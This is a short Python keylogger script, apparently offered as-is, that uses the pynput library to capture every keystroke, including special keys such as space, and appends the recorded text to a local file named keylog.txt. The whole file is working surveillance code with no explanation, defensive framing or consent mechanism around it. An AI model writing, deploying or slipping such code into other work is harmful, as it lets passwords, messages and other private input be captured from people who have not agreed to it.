import pynput.keyboard

log = ""

def append_to_log(string):
    global log
    log += string

def on_press(key):
    try:
        append_to_log(str(key.char))
    except AttributeError:
        if key == key.space:
            append_to_log(" ")
        else:
            append_to_log(f" {str(key)} ")

def write_log_to_file(log_file="keylog.txt"):
    global log
    with open(log_file, "a") as f:
        f.write(log)
    log = ""

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

with keyboard_listener:
    keyboard_listener.join()

write_log_to_file()
